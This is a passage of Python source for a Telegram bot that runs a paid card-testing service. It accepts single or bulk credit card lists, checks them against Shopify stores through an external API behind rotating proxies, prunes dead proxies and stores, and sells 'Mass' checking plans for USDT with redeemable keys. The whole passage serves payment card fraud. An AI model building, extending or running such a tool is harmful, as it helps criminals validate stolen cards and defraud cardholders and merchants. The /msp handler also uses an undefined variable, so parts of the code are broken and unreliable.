    try:
        s = await event.get_sender()
        username = s.username if s.username else f"user_{uid}"
    except Exception:
        s, username = None, f"user_{uid}"
    await create_user_if_not_exists(uid, username)
    text = build_main_menu_text(uid, s)
    if os.path.exists(WELCOME_IMAGE_PATH):
        await event.reply(text, file=WELCOME_IMAGE_PATH, buttons=get_main_keyboard(), parse_mode='html')
    else:
        await event.reply(text, buttons=get_main_keyboard(), parse_mode='html')

# ---------- /info ----------
@bot.on(events.NewMessage(pattern=r'^/info\b'))
async def info_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    sender = None
    try: sender = await event.get_sender()
    except: pass
    try:
        if sender and sender.username:
            name_line = format_username(username=sender.username)
        elif sender and sender.first_name:
            name_line = format_username(user_id=uid, display=sender.first_name)
        else:
            name_line = format_username(user_id=uid, display="User")
    except Exception:
        name_line = format_username(user_id=uid, display="User")
    plan = get_user_plan(uid)
    access = "TRIAL" if plan == "Free" else plan.upper()
    uf = load_json_file(f"user_{uid}.json", {})
    joined = (uf.get("registered_at", "") or datetime.now().isoformat())[:10]
    purchased = uf.get("registered_at", "")
    purchased = purchased[:10] if purchased else "-"
    plans = load_json_file(USER_PLANS_FILE, {})
    pinfo = plans.get(str(uid), {})
    exp = pinfo.get("expires_at", "")
    ending = exp[:10] if exp else "-"
    credits = get_credits(uid)
    credits_display = f"{credits:,}"
    text = premium_emoji(
        "[𐓷] <b>Account Info 💎</b>\n"
        "────────────\n"
        f"User : <b>{name_line}</b>\n"
        f"User ID : <code>{uid}</code>\n"
        f"Access : <b>{access}</b>\n"
        f"Purchased On : <b>{purchased}</b>\n"
        f"Ending On : <b>{ending}</b>\n"
        f"Credits : <b>{credits_display}</b>\n"
        f"Joined : <b>{joined}</b>\n"
        "────────────\n"
        f"⚡ Dev : <b>{dev_link()}</b>"
    )
    await event.reply(text, parse_mode='html', link_preview=False)

# ---------- /plan ----------
@bot.on(events.NewMessage(pattern=r'^/plan\b'))
async def plan_command(event):
    await event.reply(premium_emoji(
        "<b>Available Plans ⭐</b>\n"
        "────────────\n"
        "⭐ <b>Core</b> — Mass 1000 · 1 Day · 10 USDT\n"
        "⭐ <b>Elite</b> — Mass ∞ · 15 Days · 15 USDT\n"
        "⭐ <b>Root</b> — Mass ∞ · 30 Days · 30 USDT\n"
        "────────────\n"
        f"<b>Contact:</b> {dev_link()}"
    ), parse_mode='html')

# ---------- /feedback ----------
@bot.on(events.NewMessage(pattern=r'^/feedback\b'))
async def feedback_cmd(event):
    uid = event.sender_id
    if await check_banned(event): return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📬 <b>Reply to an image or message with</b> <code>/feedback</code>"), parse_mode='html'); return
    rm = await event.get_reply_message()
    try:
        s = await event.get_sender()
        uname = s.username if s.username else f"user_{uid}"
    except: uname = f"user_{uid}"
    header = premium_emoji(f"📬 <b>Feedback</b>\n────────────\n"
              f"User : {format_username(username=uname, user_id=uid, display=uname)}\n"
              f"User ID : <code>{uid}</code>\n────────────")
    fb = load_json_file(FEEDBACK_FILE, [])
    fb.append({'user_id': uid, 'username': uname,
               'type': 'image' if rm.photo else 'text',
               'text': rm.text or '', 'timestamp': datetime.now().isoformat()})
    save_json_file(FEEDBACK_FILE, fb)
    sent = 0
    for aid in ADMIN_IDS:
        try:
            await bot.send_message(aid, header, parse_mode='html')
            await bot.forward_messages(aid, rm)
            sent += 1
        except Exception as e:
            logging.warning(f"feedback forward failed → {aid}: {e}")
    if sent: await event.reply(premium_emoji("✅ <b>Feedback sent to admin!</b>"), parse_mode='html')
    else: await event.reply(premium_emoji("❌ Failed to send feedback."), parse_mode='html')

# ---------- CALLBACK ROUTER ----------
@bot.on(events.CallbackQuery)
async def callback_router(event):
    uid = event.sender_id
    data = event.data.decode('utf-8')
    if await check_banned(event): await event.answer("Banned", alert=True); return

    if data == "verify_join":
        if not await is_user_joined(uid): await event.answer("❌ Join all three first!", alert=True); return
        await event.answer("✅ Verified!", alert=True)
        try:
            s = await event.get_sender()
            username = s.username if s.username else f"user_{uid}"
        except Exception: s, username = None, f"user_{uid}"
        await create_user_if_not_exists(uid, username)
        text = build_main_menu_text(uid, s)
        try: await event.delete()
        except: pass
        await event.respond(text, buttons=get_main_keyboard(), parse_mode='html'); return

    if data == "main_menu":
        sender = None
        try: sender = await event.get_sender()
        except: pass
        text = build_main_menu_text(uid, sender)
        try: await event.edit(text, buttons=get_main_keyboard(), parse_mode='html')
        except: await event.respond(text, buttons=get_main_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "menu_gate":
        try: await event.edit(get_gate_menu_text(), buttons=get_gate_menu_keyboard(), parse_mode='html')
        except: await event.respond(get_gate_menu_text(), buttons=get_gate_menu_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "gate_charge":
        try: await event.edit(get_charge_menu_text(), buttons=get_charge_menu_keyboard(), parse_mode='html')
        except: await event.respond(get_charge_menu_text(), buttons=get_charge_menu_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "gate_shopify":
        try: await event.edit(get_shopify_gate_text(), buttons=get_shopify_gate_keyboard(), parse_mode='html')
        except: await event.respond(get_shopify_gate_text(), buttons=get_shopify_gate_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "gate_hitter":
        try: await event.edit(get_hitter_menu_text(), buttons=get_hitter_menu_keyboard(), parse_mode='html')
        except: await event.respond(get_hitter_menu_text(), buttons=get_hitter_menu_keyboard(), parse_mode='html')
        await event.answer(); return

    if data == "menu_buy":
        try: await event.edit(get_buy_menu_text(), buttons=get_buy_menu_keyboard(), parse_mode='html')
        except: await event.respond(get_buy_menu_text(), buttons=get_buy_menu_keyboard(), parse_mode='html')
        await event.answer(); return

    if data in ("buy_core", "buy_elite", "buy_root"):
        plans = {
            "buy_core":  ("Core ⭐",  "1 Days",  "10 USDT"),
            "buy_elite": ("Elite ⭐", "15 Days", "15 USDT"),
            "buy_root":  ("Root ⭐",  "30 Days", "30 USDT"),
        }
        name, span, price = plans[data]
        text = premium_emoji(
            f"{BOT_ICON} <b>Purchase ➳ {name}</b>\n"
            "────────────\n"
            f"Span ➳ <b>{span}</b>\n"
            f"Price ➳ <b>{price}</b>\n"
            "────────────\n"
            f"<b>Contact Dev to purchase:</b>\n➳ {dev_link()}"
        )
        kb = [
            [Button.inline("Back", b"menu_buy", style="primary")],
        ]
        try: await event.edit(text, buttons=kb, parse_mode='html')
        except: await event.respond(text, buttons=kb, parse_mode='html')
        await event.answer(); return

    if data == "mass_stop":
        stopped = 0
        for sid, sess in list(MASS_SESSIONS.items()):
            if sess.get("uid") == uid:
                sess["stop"] = True
                stopped += 1
        if stopped:
            await event.answer("⛔ Stopping...", alert=True)
        else:
            await event.answer("No active session.", alert=True)
        return

    if data == "menu_updates": await event.answer("UPDATES coming soon", alert=True); return
    if data == "menu_support": await event.answer("SUPPORT coming soon", alert=True); return
    await event.answer()

# ---------- /sp ----------
@bot.on(events.NewMessage(pattern=r'^/sp\s+'))
async def sp_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards: await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html'); return
    sites = load_sites_1_5() + load_sites_10_20()
    if not sites: await event.reply(premium_emoji("❌ No sites configured."), parse_mode='html'); return
    await run_shopify_single(event, uid, cards[0], sites)

# ---------- /msp ----------
@bot.on(events.NewMessage(pattern=r'^/msp\b'))
async def msp_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("🔴 Bot OFF."), parse_mode='html'); return
    if not event.reply_to_msg_id: await event.reply(premium_emoji("Reply to a .txt file."), parse_mode='html'); return
    rm = await event.get_reply_message()
    # Accept: .txt file OR plain text message with card data
    content = ""
    if rm.file and rm.file.name and rm.file.name.endswith('.txt'):
        fp = await rm.download_media()
        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        try: os.remove(fp)
        except: pass
    elif rm.text and rm.text.strip():
        content = rm.text
    elif rm.file:
        # Non-.txt file attached — try downloading and reading as text anyway
        fp = await rm.download_media()
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                content = await f.read()
        except Exception:
            content = ""
        try: os.remove(fp)
        except: pass
    else:
        await event.reply(premium_emoji("❌ Reply to a .txt file or a message containing card data."), parse_mode='html'); return
    if not cards: await event.reply(premium_emoji("No valid cards."), parse_mode='html'); return
    sites = load_sites_1_5() + load_sites_10_20()
    if not sites: await event.reply(premium_emoji("❌ No sites configured."), parse_mode='html'); return
    await run_shopify_mass(event, uid, sites, cards)

# ---------- STUBS ----------
@bot.on(events.NewMessage(pattern=r'^/hit\s+'))
async def hit_command(event):
    await event.reply(premium_emoji("⚡ Whop /hit — plug your WhopCheckout logic here."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/stco\s+'))
async def stco_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    if await check_bot_status(event): await event.reply(premium_emoji("Bot OFF."), parse_mode='html'); return
    await event.reply(premium_emoji("<b>Stripe Checkout</b> — coming soon."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/jio\s+'))
async def jio_command(event):
    await event.reply(premium_emoji("⚡ Jio Recharge — plug your logic here."), parse_mode='html')

# ---------- /key amount Plan ----------
@bot.on(events.NewMessage(pattern=r'^/key\s+'))
async def key_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 3:
        await event.reply(premium_emoji(
            "❌ <code>/key amount plan</code>\n\n"
            "<b>Plans:</b> Core, Elite, Root\n\n"
            "<b>Examples:</b>\n"
            "<code>/key 1 Elite</code>\n"
            "<code>/key 5 Root</code>\n"
            "<code>/key 3 Core</code>"
        ), parse_mode='html'); return
    try: amount = int(a[1])
    except: await event.reply(premium_emoji("❌ Amount must be number."), parse_mode='html'); return
    plan = " ".join(a[2:]).strip()
    if plan not in VALID_PLANS:
        await event.reply(premium_emoji(f"❌ Invalid plan. Use: {', '.join(VALID_PLANS)}"), parse_mode='html'); return
    if amount < 1 or amount > 50:
        await event.reply(premium_emoji("❌ Amount must be 1-50."), parse_mode='html'); return

    kd = load_json_file(KEYS_FILE, {})
    keys = []
    for _ in range(amount):
        k = "BARK-" + generate_key(12)
        while k in kd: k = "BARK-" + generate_key(12)
        kd[k] = {
            'plan': plan, 'days': 30, 'created_by': event.sender_id,
            'created_at': datetime.now().isoformat(),
            'used_by': None, 'used_count': 0
        }
        keys.append(k)
    save_json_file(KEYS_FILE, kd)

    keys_txt = "\n".join([f"<code>{k}</code>" for k in keys])
    await event.reply(premium_emoji(
        f"{BOT_ICON} <b>Keys Generated</b>\n"
        "────────────\n"
        f"<b>Amount ➳</b> {amount}\n"
        f"<b>Plan ➳</b> {plan}\n"
        f"<b>Days ➳</b> 30\n"
        "────────────\n"
        f"{keys_txt}\n"
        "────────────\n"
        f"<b>Redeem ➳</b> <code>/redeem KEY</code>"
    ), parse_mode='html')

# ---------- /redeem ----------
@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    a = event.message.text.split()
    if len(a) < 2: await event.reply(premium_emoji("<code>/redeem KEY</code>"), parse_mode='html'); return
    key = a[1].strip().upper()
    kd = load_json_file(KEYS_FILE, {})
    if key not in kd: await event.reply(premium_emoji("❌ Invalid key!"), parse_mode='html'); return
    if kd[key].get('used_by'): await event.reply(premium_emoji("❌ Key already used!"), parse_mode='html'); return
    plan = kd[key].get('plan', 'Core'); days = kd[key].get('days', 30)
    kd[key]['used_by'] = uid
    kd[key]['used_at'] = datetime.now().isoformat()
    save_json_file(KEYS_FILE, kd)
    set_user_plan(uid, plan, days)
    pu = load_premium_users()
    if str(uid) not in pu:
        with open(PREMIUM_FILE, 'a', encoding='utf-8') as f: f.write(f"{uid}\n")

    msg = premium_emoji(
        f"{BOT_ICON} <b>Premium Activated ⭐</b>\n"
        "────────────\n"
        f"Successfully activated premium for <b>{days}d</b>!\n"
        "Use /info to see your new expiry."
    )
    await event.reply(msg, parse_mode='html')

    await send_key_redeem_hit(uid, days)

# ---------- /revokekey ----------
@bot.on(events.NewMessage(pattern=r'^/revokekey\s+'))
async def revokekey_command(event):
    """Admin only. Revoke (delete) a key so it can never be redeemed.
    Usage: /revokekey BARK-XXXXXXXXXXXX
    Also: /revokekey all_unused  — wipe all keys that haven't been used yet
    """
    if not is_admin(event.sender_id): return
    args = event.message.text.split(None, 1)
    if len(args) < 2:
        await event.reply(premium_emoji(
            "❌ <b>Usage:</b>\n"
            "<code>/revokekey BARK-XXXXXXXXXXXX</code> — revoke single key\n"
            "<code>/revokekey all_unused</code> — wipe all unused keys"
        ), parse_mode='html')
        return

    target = args[1].strip().upper()
    kd = load_json_file(KEYS_FILE, {})

    if target == "ALL_UNUSED":
        before = len(kd)
        kd = {k: v for k, v in kd.items() if v.get('used_by')}
        removed = before - len(kd)
        save_json_file(KEYS_FILE, kd)
        await event.reply(premium_emoji(
            f"🗑 <b>All Unused Keys Revoked</b>\n"
            f"────────────\n"
            f"<b>Removed:</b> {removed} keys\n"
            f"<b>Kept (used):</b> {len(kd)} keys"
        ), parse_mode='html')
        return

    if target not in kd:
        await event.reply(premium_emoji(f"❌ Key not found: <code>{target}</code>"), parse_mode='html')
        return

    key_data = kd.pop(target)
    save_json_file(KEYS_FILE, kd)

    used_by = key_data.get('used_by')
    plan = key_data.get('plan', '?')
    was_used = f"<b>Used by:</b> <code>{used_by}</code>" if used_by else "<b>Status:</b> Was unused"

    await event.reply(premium_emoji(
        f"🗑 <b>Key Revoked</b>\n"
        f"────────────\n"
        f"<b>Key:</b> <code>{target}</code>\n"
        f"<b>Plan:</b> {plan}\n"
        f"{was_used}\n"
        f"────────────\n"
        f"<i>Key deleted. Cannot be redeemed.</i>"
    ), parse_mode='html')

# ---------- /addpxy ----------
@bot.on(events.NewMessage(pattern=r'^/addpxy\b'))
async def add_proxy_shopify(event):
    uid = event.sender_id
    if await check_banned(event): return
    lines = event.message.text.split('\n')
    if len(lines) < 2: await event.reply(premium_emoji("Usage:\n<code>/addpxy\nip:port:user:pass</code>"), parse_mode='html'); return
    new = [l.strip() for l in lines[1:] if l.strip()]
    cur = load_user_proxies(uid, "shopify")
    added = [p for p in new if p not in cur]
    if not added: await event.reply(premium_emoji("Already exist."), parse_mode='html'); return
    cur.extend(added)
    save_user_proxies(uid, cur, "shopify")
    await event.reply(premium_emoji(f"✅ Added {len(added)} proxies! Total: {len(cur)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getpxy\b'))
async def get_proxy_shopify(event):
    uid = event.sender_id
    ps = load_user_proxies(uid, "shopify")
    if not ps: await event.reply(premium_emoji("No proxies. Add with /addpxy"), parse_mode='html'); return
    txt = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(ps[:50])])
    await event.reply(premium_emoji(f"<b>Your Proxies ({len(ps)}):</b>\n\n{txt}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/exportpxy\b'))
async def exportpxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    ps = load_user_proxies(uid, "shopify")
    if not ps:
        await event.reply(premium_emoji("❌ No proxies to export."), parse_mode='html')
        return
    content = "\n".join(ps)
    await event.reply(premium_emoji(f"📄 <b>Exporting {len(ps)} proxies...</b>"), parse_mode='html')
    await event.client.send_file(
        event.chat_id,
        file=content.encode('utf-8'),
        attributes=[],
        caption=premium_emoji(f"✅ <b>Alive Proxies — {len(ps)} total</b>"),
        force_document=True,
        file_name="alive_proxies.txt",
        parse_mode='html'
    )

@bot.on(events.NewMessage(pattern=r'^/delpxy\b'))
async def del_proxy_shopify(event):
    uid = event.sender_id
    if await check_banned(event): return
    fp = get_user_proxy_file(uid, "shopify")
    if not os.path.exists(fp) or not load_user_proxies(uid, "shopify"):
        await event.reply(premium_emoji("❌ No proxies to remove."), parse_mode='html'); return
    open(fp, 'w').close()
    await event.reply(premium_emoji("🗑 <b>All proxies cleared.</b> Add fresh ones with /addpxy"), parse_mode='html')

# ---------- PROXY CHECKER ----------
def _parse_proxy_url(proxy: str):
    """
    Parse any common proxy format into a proxy_url string aiohttp can use.

    Supported formats:
      ip:port
      ip:port:user:pass
      user:pass:ip:port          (some tools export this order)
      user:pass@host:port
      host:port:user:pass
      socks5://user:pass@host:port
      socks5://host:port
      http://user:pass@host:port
      http://host:port

    Returns proxy_url string on success, None if unparseable.
    """
    p = proxy.strip()
    if not p:
        return None

    # Already a full URL
    if p.startswith(('http://', 'https://', 'socks5://', 'socks4://')):
        return p

    # user:pass@host:port
    if '@' in p:
        # e.g. user:pass@1.2.3.4:8080
        return f"http://{p}"

    parts = p.split(':')

    if len(parts) == 2:
        # host:port
        try:
            int(parts[1])
            return f"http://{parts[0]}:{parts[1]}"
        except ValueError:
            return None

    if len(parts) == 4:
        # Detect: does part[0] look like an IP or is it a username?
        # Heuristic: if parts[1] is numeric it's likely host:port:user:pass
        #            if parts[3] is numeric it's likely user:pass:host:port
        p1_is_port = False
        p3_is_port = False
        try: int(parts[1]); p1_is_port = True
        except ValueError: pass
        try: int(parts[3]); p3_is_port = True
        except ValueError: pass

        if p1_is_port:
            # ip:port:user:pass
            host, port, user, pwd = parts
            return f"http://{user}:{pwd}@{host}:{port}"
        elif p3_is_port:
            # user:pass:ip:port
            user, pwd, host, port = parts
            return f"http://{user}:{pwd}@{host}:{port}"
        else:
            return None

    return None


async def _test_proxy(proxy: str, timeout: int = 10) -> bool:
    """Returns True if proxy is alive and routable."""
    proxy_url = _parse_proxy_url(proxy)
    if proxy_url is None:
        return False   # Unparseable format → treat as dead, not error
    try:
        to = aiohttp.ClientTimeout(total=timeout)
        async with aiohttp.ClientSession(timeout=to) as s:
            async with s.get(
                "http://ip-api.com/json",
                proxy=proxy_url,
                ssl=False
            ) as r:
                return r.status == 200
    except Exception:
        return False

@bot.on(events.NewMessage(pattern=r'^/chkpxy\b'))
async def chkpxy_command(event):
    uid = event.sender_id
    if await check_banned(event): return
    proxies = load_user_proxies(uid, "shopify")
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies loaded. Add with /addpxy"), parse_mode='html')
        return
    total = len(proxies)
    msg = await event.reply(premium_emoji(
        f"🔄 <b>Checking {total} proxies...</b>\n<i>This may take a moment.</i>"
    ), parse_mode='html')
    CONCURRENCY = 20
    alive, dead = [], []
    sem = asyncio.Semaphore(CONCURRENCY)
    done = [0]
    async def check_one(p):
        async with sem:
            result = await _test_proxy(p)
            done[0] += 1
            if result:
                alive.append(p)
            else:
                dead.append(p)
            if done[0] % 50 == 0 or done[0] == total:
                try:
                    await msg.edit(premium_emoji(
                        f"🔄 <b>Checking proxies...</b>\n"
                        f"Progress: {done[0]}/{total}\n"
                        f"✅ Alive: {len(alive)}  ❌ Dead: {len(dead)}"
                    ), parse_mode='html')
                except Exception:
                    pass
    await asyncio.gather(*[check_one(p) for p in proxies])
    # Save only alive proxies back
    save_user_proxies(uid, alive, "shopify")

    # Build dead list preview (up to 15 shown)
    dead_preview = ""
    if dead:
        dead_lines = [f"❌ <code>{d}</code>" for d in dead[:15]]
        if len(dead) > 15:
            dead_lines.append(f"<i>...and {len(dead)-15} more</i>")
        dead_preview = "\n<b>Dead Proxies:</b>\n" + "\n".join(dead_lines)

    await msg.edit(premium_emoji(
        f"✅ <b>Proxy Check Complete</b>\n"
        f"─────────────────\n"
        f"Total Checked : <b>{total}</b>\n"
        f"✅ Alive Saved : <b>{len(alive)}</b>\n"
        f"❌ Dead Removed: <b>{len(dead)}</b>\n"
        f"─────────────────\n"
        f"<i>Alive proxies saved. Dead ones removed.</i>"
        + dead_preview
    ), parse_mode='html')

# ---------- SITE CHECKER ----------
async def _test_site(site: str, timeout: int = 15) -> bool:
    """Returns True if site is a reachable Shopify store.

    Strategy (layered — stops at first positive):
      1. x-shopify-* response header (fastest, most reliable)
      2. powered-by: Shopify header
      3. Body contains shopify CDN / myshopify markers
      4. Final redirect URL contains myshopify.com or shop.app (legit Shopify)
      5. Status 200 + body contains /cdn/shop/  (Shopify CDN path)
    Dead = timeout, 4xx/5xx with no Shopify signal, or pure non-Shopify 200.
    """
    try:
        url = site.strip()
        if not url.startswith('http'):
            url = 'https://' + url
        to = aiohttp.ClientTimeout(total=timeout)
        req_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        async with aiohttp.ClientSession(timeout=to) as s:
            async with s.get(url, headers=req_headers, allow_redirects=True,
                             max_redirects=10) as r:
                # 1. Header check (reliable, no body read needed)
                resp_headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}
                for hk, hv in resp_headers_lower.items():
                    if 'shopify' in hk or 'shopify' in hv:
                        return True
                    if hk == 'x-powered-by' and 'shopify' in hv:
                        return True

                # 2. Final redirect URL check
                final_url = str(r.url).lower()
                if 'myshopify.com' in final_url or 'shop.app' in final_url:
                    return True

                # 3. Non-200 status after redirects = dead
                if r.status not in (200, 206):
                    return False

                # 4. Body scan (read first 32KB max — saves bandwidth)
                try:
                    raw = await r.content.read(32768)
                    text = raw.decode('utf-8', errors='ignore')
                except Exception:
                    return False

                body_markers = [
                    'myshopify.com', 'cdn.shopify.com', '/cdn/shop/',
                    'Shopify.theme', 'window.Shopify', 'ShopifyAnalytics',
                    'shopify-section', 'data-shopify', 'shopify_pay',
                    'Powered by Shopify',
                ]
                return any(m in text for m in body_markers)
    except asyncio.TimeoutError:
        return False
    except Exception:
        return False

@bot.on(events.NewMessage(pattern=r'^/chksites\b'))
async def chksites_command(event):
    if not is_admin(event.sender_id): return
    s1 = load_sites_1_5()
    s2 = load_sites_10_20()
    all_sites = list(set(s1 + s2))
    if not all_sites:
        await event.reply(premium_emoji("❌ No sites loaded. Add with /addsite first."), parse_mode='html')
        return
    total = len(all_sites)
    msg = await event.reply(premium_emoji(
        f"🔄 <b>Checking {total} sites...</b>\n<i>Verifying Shopify fingerprint on each.</i>"
    ), parse_mode='html')
    CONCURRENCY = 30
    alive_1_5, alive_10_20, dead_list = [], [], []
    sem = asyncio.Semaphore(CONCURRENCY)
    done = [0]
    # Map each site back to its original tier
    tier_map = {}
    for s in s1:
        tier_map[s] = '1_5'
    for s in s2:
        tier_map[s] = '10_20'  # 10_20 overwrites if duplicate — fine
    async def check_one(site):
        async with sem:
            result = await _test_site(site)
            done[0] += 1
            tier = tier_map.get(site, '1_5')
            if result:
                if tier == '1_5':
                    alive_1_5.append(site)
                else:
                    alive_10_20.append(site)
            else:
                dead_list.append(site)
            if done[0] % 100 == 0 or done[0] == total:
                alive_count = len(alive_1_5) + len(alive_10_20)
                try:
                    await msg.edit(premium_emoji(
                        f"🔄 <b>Checking sites...</b>\n"
                        f"Progress: {done[0]}/{total}\n"
                        f"✅ Alive: {alive_count}  ❌ Dead: {len(dead_list)}"
                    ), parse_mode='html')
                except Exception:
                    pass
    await asyncio.gather(*[check_one(s) for s in all_sites])
    # Overwrite both site files with only alive sites
    with open(SITES_1_5_FILE, 'w', encoding='utf-8') as f:
        for s in alive_1_5: f.write(f"{s}\n")
    with open(SITES_10_20_FILE, 'w', encoding='utf-8') as f:
        for s in alive_10_20: f.write(f"{s}\n")
    alive_total = len(alive_1_5) + len(alive_10_20)
    await msg.edit(premium_emoji(
        f"✅ <b>Site Check Complete</b>\n"
        f"─────────────────\n"
        f"Total Checked  : <b>{total}</b>\n"
        f"✅ Alive (1_5)  : <b>{len(alive_1_5)}</b>\n"
        f"✅ Alive (10_20): <b>{len(alive_10_20)}</b>\n"
        f"❌ Dead Removed : <b>{len(dead_list)}</b>\n"
        f"─────────────────\n"
        f"<i>Alive sites saved. Dead ones purged from both lists.</i>"
    ), parse_mode='html')

# ---------- ADMIN ----------
@bot.on(events.NewMessage(pattern=r'^/bot\s+(on|off)$'))
async def bot_toggle_command(event):
    if not is_admin(event.sender_id): return
    s = event.message.text.split()[1].lower(); set_bot_status(s)
    await event.reply(premium_emoji(f"{'🟢' if s=='on' else '🔴'} <b>Bot {s.upper()}</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/ban\s+'))
async def ban_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip()
    if t in load_banned(): await event.reply(premium_emoji("Already banned."), parse_mode='html'); return
    with open(BANNED_FILE, 'a') as f: f.write(f"{t}\n")
    await event.reply(premium_emoji(f"🚫 <b>{t} banned!</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/unban\s+'))
async def unban_command(event):
    if not is_admin(event.sender_id): return
    a = event.message.text.split()
    if len(a) < 2: return
    t = a[1].strip(); b = load_banned()
    if t not in b: await event.reply(premium_emoji("Not banned."), parse_mode='html'); return
    with open(BANNED_FILE, 'w') as f:
        for x in b:
            if x != t: f.write(f"{x}\n")
    await event.reply(premium_emoji(f"✅ <b>{t} unbanned!</b>"), parse_mode='html')

# ---------- API MANAGEMENT ----------
@bot.on(events.NewMessage(pattern=r'^/setapi\s+'))
async def setapi_command(event):
    if not is_admin(event.sender_id): return
    global SHOPI_API_URL
    new_url = event.message.text.split(None, 1)[1].strip()
    # Strip query string — store base URL only
    parsed = urlparse(new_url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    old = SHOPI_API_URL
    SHOPI_API_URL = base
    save_api_url(base)
    await event.reply(premium_emoji(
        f"✅ <b>API Updated & Saved</b>\n"
        f"<b>Old:</b> <code>{old}</code>\n"
        f"<b>New:</b> <code>{SHOPI_API_URL}</code>\n\n"
        f"<i>Saved to disk — survives restart. Run /testapi to verify.</i>"
    ), parse_mode='html')

# ---------- API DIAGNOSTIC ----------
@bot.on(events.NewMessage(pattern=r'^/testapi\s+'))
async def testapi_command(event):
    if not is_admin(event.sender_id): return
    args = event.message.text.split(None, 1)
    if len(args) < 2:
        await event.reply(premium_emoji(
            "❌ Usage: <code>/testapi 4111111111111111|01|2026|123</code>"
        ), parse_mode='html')
        return
    card = args[1].strip()
    # Guard: reject if someone accidentally passes a URL instead of a card
    if card.startswith('http') or '/' in card.split('|')[0]:
        await event.reply(premium_emoji(
            "❌ <b>That looks like a URL, not a card.</b>\n\n"
            "To change the API endpoint use: <code>/setapi https://newapi.example.com/shopify</code>\n"
            "To test a card use: <code>/testapi 4111111111111111|01|2026|123</code>"
        ), parse_mode='html')
        return
    s1 = load_sites_1_5()
    s2 = load_sites_10_20()
    all_sites = s1 + s2
    if not all_sites:
        await event.reply(premium_emoji("❌ No sites loaded. Add with /addsite first."), parse_mode='html')
        return
    site = random.choice(all_sites)
    proxies = load_user_proxies(event.sender_id, gate="shopify")
    proxy = random.choice(proxies) if proxies else None
    url = (
        f"{SHOPI_API_URL}?site={urllib.parse.quote(site, safe='')}"
        f"&cc={urllib.parse.quote(card, safe='')}"
        + (f"&proxy={urllib.parse.quote(proxy, safe='')}" if proxy else "")
    )
    await event.reply(premium_emoji(f"🔍 <b>Firing test request...</b>\n<code>{url[:200]}</code>"), parse_mode='html')
    try:
        to = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=to) as s:
            async with s.get(url) as r:
                status_code = r.status
                try:
                    raw = await r.json(content_type=None)
                    import json as _json
                    raw_text = _json.dumps(raw, indent=2)[:1000]
                except Exception:
                    raw_text = (await r.text())[:1000]
        reply = (
            f"{BOT_ICON} <b>API Response</b>\n"
            f"<b>HTTP:</b> {status_code}\n"
            f"<b>Site:</b> <code>{site}</code>\n"
            f"<b>Proxy:</b> <code>{'yes' if proxy else 'none'}</code>\n\n"
            f"<pre>{raw_text}</pre>"
        )
    except asyncio.TimeoutError:
        reply = premium_emoji("❌ <b>Timeout</b> — API did not respond within 60s.")
    except Exception as e:
        reply = premium_emoji(f"❌ <b>Exception:</b> <code>{str(e)[:300]}</code>")
    await event.reply(reply, parse_mode='html')

# ---------- SITE MANAGEMENT ----------
@bot.on(events.NewMessage(pattern=r'^/chksite\b'))
async def chksite_command(event):
    if not is_admin(event.sender_id): return
    s1 = load_sites_1_5()
    s2 = load_sites_10_20()
    total = len(s1) + len(s2)
    f1_exists = os.path.exists(SITES_1_5_FILE)
    f2_exists = os.path.exists(SITES_10_20_FILE)
    lines = [
        f"{BOT_ICON} <b>Site Diagnostic</b>",
        f"",
        f"<b>sites_1_5.txt</b> — {'✅ exists' if f1_exists else '❌ missing'} — <b>{len(s1)} sites</b>",
        f"<b>sites_10_20.txt</b> — {'✅ exists' if f2_exists else '❌ missing'} — <b>{len(s2)} sites</b>",
        f"",
        f"<b>Total loaded:</b> {total}",
        f"",
        f"{'✅ Ready — /sp will reach API' if total > 0 else '❌ No sites — /sp returns Site errors'}",
    ]
    await event.reply(premium_emoji('\n'.join(lines)), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/addsite\s+'))
async def addsite_command(event):
    if not is_admin(event.sender_id): return
    args = event.message.text.split(None, 2)
    # usage: /addsite <1_5|10_20> <url>
    if len(args) < 3:
        await event.reply(premium_emoji("❌ Usage: <code>/addsite 1_5 https://example.com</code> or <code>/addsite 10_20 https://example.com</code>"), parse_mode='html')
        return
    tier, url = args[1].strip().lower(), args[2].strip()
    if tier == '1_5':
        fp = SITES_1_5_FILE
    elif tier in ('10_20', '10-20'):
        fp = SITES_10_20_FILE
    else:
        await event.reply(premium_emoji("❌ Tier must be <code>1_5</code> or <code>10_20</code>"), parse_mode='html')
        return
    existing = get_file_lines(fp)
    if url in existing:
